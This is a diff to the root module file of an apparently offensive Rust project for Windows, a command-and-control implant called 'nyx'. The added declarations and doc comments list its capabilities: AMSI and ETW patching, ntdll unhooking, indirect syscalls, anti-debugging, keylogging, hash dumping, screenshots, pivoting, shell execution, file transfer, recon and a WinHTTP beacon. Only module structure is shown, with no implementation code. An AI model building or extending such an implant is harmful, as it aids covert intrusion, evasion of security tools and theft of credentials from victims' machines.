@@ -19,10 +19,18 @@
 //! - [`heap`] — alloc glue (Vec/String + a raw-byte `Str`) for the PEB walk.
 //! - [`resolve`] — PEB walk + djb2 API resolution; bridges to `nyx_evasion`
 //!   so the SSN resolver runs over the *live* ntdll. (Windows-only.)
-//! - (A3) `alloc` — NT-Heap `GlobalAlloc`.
-//! - (A4) `entry` — PIC entry stub.
-//! - (A5) `transport` — minimal WinHTTP check-in.
-//! - (A6) indirect-syscall runtime wired to `nyx_evasion`.
+//! - [`ntalloc`] — NT-Heap `GlobalAlloc`.
+//! - [`syscalls`] — indirect-syscall runtime (SSN table + ntdll gadget +
+//!   trampoline); 4/6/11-arg wrappers + a process-wide global accessor.
+//! - [`config`] — per-build encrypted config (`nyx_config_macros::embed!`).
+//! - [`hostinfo`] — real `SessionInfo` (hostname/user/pid/admin/beacon_id).
+//! - [`fs`] — Upload/Download/FileOp via NT syscalls.
+//! - [`shell`] — `Shell` via `CreateProcessW` + redirected pipes.
+//! - [`recon`] — DriveInfo/Env/Clipboard/Portscan/Net.
+//! - [`bof`] — W^X COFF loader + Beacon-API shims.
+//! - [`blind`] / [`unhook`] — AMSI/ETW patch + KnownDlls NTDLL unhook.
+//! - [`transport`] — WinHTTP POST for the beacon frame.
+//! - [`entry`] — PIC entry + selftests.
 
 #![no_std]
 #![no_main]
@@ -42,15 +50,45 @@ pub mod heap;
 #[cfg(target_os = "windows")]
 pub mod ntalloc;
 #[cfg(target_os = "windows")]
+pub mod antidebug;
+#[cfg(target_os = "windows")]
 pub mod beacon;
 #[cfg(target_os = "windows")]
 pub mod blind;
 #[cfg(target_os = "windows")]
 pub mod bof;
 #[cfg(target_os = "windows")]
+pub mod config;
+#[cfg(target_os = "windows")]
 pub mod entry;
 #[cfg(target_os = "windows")]
+pub mod fs;
+#[cfg(target_os = "windows")]
+pub mod hashdump;
+#[cfg(target_os = "windows")]
+pub mod hostinfo;
+#[cfg(target_os = "windows")]
+pub mod keylog;
+#[cfg(target_os = "windows")]
+pub mod mem;
+#[cfg(target_os = "windows")]
+pub mod pivot;
+#[cfg(target_os = "windows")]
+pub mod postex;
+#[cfg(target_os = "windows")]
+pub mod recon;
+#[cfg(target_os = "windows")]
 pub mod resolve;
+#[cfg(target_os = "windows")]
+pub mod screenshot;
+#[cfg(target_os = "windows")]
+pub mod selftests;
+#[cfg(target_os = "windows")]
+pub mod shell;
+#[cfg(target_os = "windows")]
+pub mod sleep;
+#[cfg(target_os = "windows")]
+pub mod stack;
 #[cfg(target_os = "windows")]
 pub mod syscalls;
 #[cfg(target_os = "windows")]
